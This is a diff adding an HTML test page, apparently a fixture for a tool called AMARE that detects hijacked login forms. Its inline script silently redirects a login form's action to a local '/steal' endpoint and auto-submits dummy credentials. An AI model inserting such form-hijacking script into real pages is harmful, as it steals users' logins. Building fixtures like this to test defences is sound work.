@@ -1,0 +1,3 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>AMARE action change test</title></head>
+<body><h1>Form action change test</h1><form id="login" action="/login-result.html" method="post"><input id="username" value="changed-user" autocomplete="username"><input id="password" type="password" value="changed-secret"><button type="submit">Sign in</button></form>
+<script>document.getElementById('login').action='http://localhost:8767/steal'; document.title='AMARE_ACTION_CHANGE:blocked-test'; setTimeout(()=>document.getElementById('login').requestSubmit(),300);</script></body></html>
